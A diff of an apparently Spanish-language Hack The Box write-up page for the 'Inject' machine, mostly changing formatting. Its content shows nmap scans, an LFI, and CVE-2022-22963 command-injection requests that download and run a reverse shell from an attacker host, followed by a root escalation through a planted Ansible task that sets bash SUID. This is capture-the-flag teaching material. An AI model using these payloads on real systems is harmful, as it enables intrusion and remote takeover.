@@ -83,7 +83,6 @@
                 </ul>
               </nav>
             </div>
-            <div class="navigation-wrapper">
               <div>
                 <nav class="cover-navigatio cover-navigation--primary">
                   <ul class="navigation">
@@ -92,7 +91,6 @@
                   </ul>
                 </nav>
               </div>
-            </div>
             
             <div><nav class="cover-navigation navigation--social">
     <ul class="navigation">
@@ -163,7 +161,7 @@
 <li><a href="#root">Escalada Usuario Phill a Root</a></li>
 </ul>
 <h2 id="Reconocimiento">Reconocimiento</h2>
-<p>Vamos a empezar haciendo un escaneo de puertos con Nmap</p>
+<p>Vamos a empezar haciendo un escaneo de puertos con <code>Nmap</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allports 10.10.11.204
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
@@ -184,7 +182,7 @@
 </span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.31 seconds
 </span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">70185</span> <span style="color:#f92672">(</span>3.088MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">69796</span> <span style="color:#f92672">(</span>2.792MB<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>Ahora vamos a user Nmap con los scripts de reconocimiento básicos</p>
+</span></span></code></pre></div><p>Ahora vamos a user <code>Nmap</code> con los scripts de reconocimiento básicos</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,8080 10.10.11.204 -oN Targeted
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.204
@@ -202,43 +200,43 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.12 seconds
-</span></span></code></pre></div><p>Si miramos un poco la pagina veremos que tiene un apartado de subida de archivos</p>
+</span></span></code></pre></div><p>Si miramos un poco la pagina veremos que tiene un apartado de <code>subida de archivos</code></p>
 <p><img src="/htb/Inject/images/1.png" alt="Inject"></p>
 <h2 id="LFI">Explotación del LFI</h2>
-<p>Cuando subimos un archivo veremos que nos deja ver la imagen que hemos subido, pero si miramos con detalle la url, veremos que hay posibilidad de que se acontezca un LFI</p>
+<p>Cuando subimos un archivo veremos que nos deja ver la imagen que hemos subido, pero si miramos con detalle la url, veremos que hay posibilidad de que se acontezca un <code>LFI</code></p>
 <p><img src="/htb/Inject/images/2.png" alt="Inject"></p>
-<p>Podemos probar a listar el etc/passwd de la maquina (con burpsuite podremos ver el output)</p>
+<p>Podemos probar a listar el <code>etc/passwd</code> de la maquina (con burpsuite podremos ver el output)</p>
 <p><img src="/htb/Inject/images/3.png" alt="Inject"></p>
-<p>También podremos ver que tenemos capacidad de directory listing</p>
+<p>También podremos ver que tenemos capacidad de <code>directory listing</code></p>
 <p><img src="/htb/Inject/images/4.png" alt="Inject"></p>
-<p>Con todo esto podemos ir buscando si hay algo interesante, si buscamos, encontraremos que esta pagina esta usando <strong>springframework</strong></p>
+<p>Con todo esto podemos ir buscando si hay algo interesante, si buscamos, encontraremos que esta pagina esta usando <code>springframework</code></p>
 <p><img src="/htb/Inject/images/5.png" alt="Inject">
 <img src="/htb/Inject/images/6.png" alt="Inject"></p>
 <h2 id="framework">Abuso del Spring-framework desactualizado</h2>
-<p>Buscando encontraremos un CVE para ese servicio</p>
+<p>Buscando encontraremos un <code>CVE</code> para ese servicio</p>
 <p>CVE &ndash;&gt; <a href="https://github.com/me2nuk/CVE-2022-22963">https://github.com/me2nuk/CVE-2022-22963</a></p>
 <p>Si hacemos la peticion tal como indica el CVE y le indicamos que haga un ping a nuestra maquina, veremos que ejecuta el comando perfectamente</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;curl 10.10.14.9:8081&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
 </span></span></code></pre></div><p>Ahora podemos probar a enviar una Reverse Shell, pero no nos funcionara, como solución a esto podemos crear un archivo con el comando de la Reverse Shell en nuestro directorio de trabajo y hacer que se lo descargue para posteriormente ejecutarlo</p>
-<p>Si creamos un servidor http con Python en el directorio donde tenemos la reverseshell y le hacemos un curl a este, podremos ver con el LFI que nos lo hemos descargado</p>
+<p>Si creamos un servidor http con Python en el directorio donde tenemos la <code>reverseshell</code> y le hacemos un curl a este, podremos ver con el <code>LFI</code> que nos lo hemos descargado</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;curl 10.10.14.9:8081/reverse.sh -o /var/www/WebApp/reverse&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
 </span></span></code></pre></div><p>Ahora solo tendríamos que ejecutarlo</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST  http://10.10.11.204:8080/functionRouter -H <span style="color:#e6db74">&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;bash /var/www/WebApp/reverse&#34;)&#39;</span> --data-raw <span style="color:#e6db74">&#39;data&#39;</span> -v
 </span></span></code></pre></div><h2 id="Phill">Escalada Usuario Frank a Phill</h2>
-<p>Y con esto ya tendíamos acceso al usuario  <strong>Frank</strong>, ahora para conseguir la flag necesitamos escalar al usuario <strong>Phil</strong></p>
-<p>Dentro del home del usuario Frank, podemos ver que hay una carpeta rara (.m2), esta carpeta contiene un settings.xml el cual contiene la contraseña para el usuario Phil</p>
+<p>Y con esto ya tendíamos acceso al usuario  <code>Frank</code>, ahora para conseguir la flag necesitamos escalar al usuario <code>Phil</code></p>
+<p>Dentro del home del usuario <code>Frank</code>, podemos ver que hay una carpeta rara (.m2), esta carpeta contiene un settings.xml el cual contiene la contraseña para el usuario <code>Phil</code></p>
 <p><img src="/htb/Inject/images/7.png" alt="Inject"></p>
 <h2 id="root">Escalada Usuario Phill a Root</h2>
-<p>Si probamos esta contraseña veremos que es correcta y podremos acceder a la user flag.</p>
+<p>Si probamos esta contraseña veremos que es correcta y podremos acceder a la <code>user flag</code>.</p>
 <p><img src="/htb/Inject/images/8.png" alt="Inject"></p>
 <p>Ahora para la root, empezamos pasándonos el pspy a nuestra maquina victima, con el veremos que hay un proceso curioso cuanto menos</p>
 <p><img src="/htb/Inject/images/9.png" alt="Inject"></p>
-<p>Hay un proceso automático ejecutando todos los archivos .yml de la carpeta /tasks</p>
+<p>Hay un proceso automático ejecutando todos los archivos .yml de la carpeta <code>/tasks</code></p>
 <p>Vamos a la carpeta, y veremos que como estamos en el grupo staff podemos crear archivos dentro!</p>
 <p><img src="/htb/Inject/images/10.png" alt="Inject"></p>
-<p>Ahora crearemos un .yml que ejecute un comando para que la bash se vuelva SUID cuando ansible ejecute este archivo:</p>
+<p>Ahora crearemos un .yml que ejecute un comando para que la bash se vuelva <code>SUID</code> cuando ansible ejecute este archivo:</p>
 <p><img src="/htb/Inject/images/11.png" alt="Inject"></p>
-<p>Cuando el proceso se ejecute borrara nuestro yml pero nos pondrá la bash en SUID</p>
+<p>Cuando el proceso se ejecute borrara nuestro yml pero nos pondrá la bash en <code>SUID</code></p>
 <p><img src="/htb/Inject/images/12.png" alt="Inject"></p>
 <p>Ahora solo hay que ejecutarla</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -p
@@ -253,11 +251,11 @@
     
     <div class="read-more-item">
         <span class="read-more-item-dim">Recent</span>
-        <h2 class="post-list__post-title post-title"><a href="/htb/2022/10/htb-pc/" title="link to HTB - PC">HTB - PC</a></h2>
-        <p class="excerpt">Resolucion de la maquina PC - Easy</p>
+        <h2 class="post-list__post-title post-title"><a href="/htb/2022/09/htb-goodgames/" title="link to HTB - GoodGames">HTB - GoodGames</a></h2>
+        <p class="excerpt">Resolucion de la maquina GoodGames - Easy</p>
         <div class="post-list__meta">
-            <time datetime=" 2022-08-23 07:28:17 &#43;0800" class="post-list__meta--date date">2022-10-04</time>
-             <span class="post-list__meta--tags tags">   • <a href="https://rug4lo.github.io/tags/token-hijacking">Token Hijacking</a>   • <a href="https://rug4lo.github.io/tags/sql-injection">SQL Injection</a>   • <a href="https://rug4lo.github.io/tags/ssh">ssh</a>   • <a href="https://rug4lo.github.io/tags/privilege-escalation">Privilege Escalation</a>  </span> 
+            <time datetime=" 2022-08-23 07:28:17 &#43;0800" class="post-list__meta--date date">2022-09-26</time>
+             <span class="post-list__meta--tags tags">   • <a href="https://rug4lo.github.io/tags/sqli">SQLI</a>   • <a href="https://rug4lo.github.io/tags/password-reuse">Password Reuse</a>   • <a href="https://rug4lo.github.io/tags/ssti">SSTI</a>   • <a href="https://rug4lo.github.io/tags/docker-breakout">Docker Breakout</a>  </span> 
         </div>
     </div>
     
